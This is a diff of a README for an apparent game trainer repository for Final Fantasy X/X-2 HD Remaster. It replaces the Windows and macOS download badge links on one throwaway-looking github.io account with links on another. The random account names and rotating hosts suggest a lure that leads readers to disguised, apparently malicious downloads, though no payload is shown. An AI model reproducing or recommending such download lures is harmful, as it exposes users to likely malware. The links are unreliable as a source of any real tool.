@@ -12,7 +12,7 @@
 
 [![skillicons](https://skillicons.dev/icons?i=windows,apple,github)](https://github.com/gaspnwkrgbnb/final-fantasy-x-x-2-hd-remaster-trainer)
 
-[![Get Trainer](https://img.shields.io/badge/⬇️_Get_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Get Trainer](https://img.shields.io/badge/⬇️_Get_Trainer-FF4444?style=for-the-badge&logoColor=white)](https://WaterCongressman.github.io/win-download/)
 
 ![Final Fantasy X/X-2 HD Remaster](game.jpg)
 
@@ -76,7 +76,7 @@ The **Final Fantasy X/X-2 HD Remaster Trainer** solves all these issues, giving 
 
 ## 🍎 macOS
 
-[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://WatchMizukageSnap.github.io/getmac/)
+[![macOS](https://img.shields.io/badge/macOS-Get_Tool-silver?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
 
 ## ⚖️ Legal
 
